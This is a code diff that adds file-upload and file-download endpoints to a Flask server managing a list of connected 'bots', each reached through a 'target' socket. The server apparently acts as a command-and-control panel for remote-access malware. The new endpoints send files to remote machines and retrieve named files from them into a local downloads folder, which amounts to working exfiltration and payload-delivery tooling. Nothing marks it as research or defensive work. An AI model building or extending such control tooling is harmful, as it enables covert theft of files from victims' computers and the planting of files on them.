@@ -506,6 +506,103 @@ def force_remove_agent():
             'error': f'Force removal failed: {str(e)}'
         }), 500
 
+@app.route('/api/send_file', methods=['POST'])
+def send_file_to_agent():
+    try:
+        session_id = int(request.form.get('session_id'))
+        if 'file' not in request.files:
+            return jsonify({'error': 'No file part'}), 400
+            
+        file = request.files['file']
+        if file.filename == '':
+            return jsonify({'error': 'No selected file'}), 400
+            
+        if session_id not in Bot.botList:
+            return jsonify({'error': 'Invalid session ID'}), 400
+            
+        bot = Bot.botList[session_id]
+        
+        # Send upload command with filename
+        bot.reliable_send({
+            'command': 'upload',
+            'filename': file.filename
+        })
+        
+        # Send file data
+        file_data = file.read()
+        bot.target.sendall(len(file_data).to_bytes(8, byteorder='big'))
+        bot.target.sendall(file_data)
+        
+        # Get confirmation
+        response = bot.reliable_recv()
+        if response.get('success'):
+            return jsonify({
+                'success': True,
+                'message': f'File {file.filename} uploaded successfully'
+            })
+        else:
+            return jsonify({
+                'error': response.get('error', 'Upload failed')
+            }), 500
+            
+    except Exception as e:
+        logging.error(f"Error in file upload: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/download_file', methods=['POST'])
+def download_file_from_agent():
+    try:
+        data = request.get_json()
+        session_id = int(data.get('session_id'))
+        filename = data.get('filename')
+        
+        if not filename:
+            return jsonify({'error': 'No filename provided'}), 400
+            
+        if session_id not in Bot.botList:
+            return jsonify({'error': 'Invalid session ID'}), 400
+            
+        bot = Bot.botList[session_id]
+        
+        # Send download command
+        bot.reliable_send({
+            'command': 'download',
+            'filename': filename
+        })
+        
+        # Receive file size
+        size_data = bot.target.recv(8)
+        file_size = int.from_bytes(size_data, byteorder='big')
+        
+        # Create downloads directory if it doesn't exist
+        os.makedirs('downloads', exist_ok=True)
+        
+        # Receive and save file
+        save_path = os.path.join('downloads', os.path.basename(filename))
+        received = 0
+        with open(save_path, 'wb') as f:
+            while received < file_size:
+                chunk = bot.target.recv(min(4096, file_size - received))
+                if not chunk:
+                    break
+                f.write(chunk)
+                received += len(chunk)
+        
+        if received == file_size:
+            return jsonify({
+                'success': True,
+                'message': f'File {filename} downloaded successfully',
+                'path': save_path
+            })
+        else:
+            return jsonify({
+                'error': 'Download incomplete'
+            }), 500
+            
+    except Exception as e:
+        logging.error(f"Error in file download: {str(e)}")
+        return jsonify({'error': str(e)}), 500
+
 if __name__ == '__main__':
     try:
         # Register signal handler
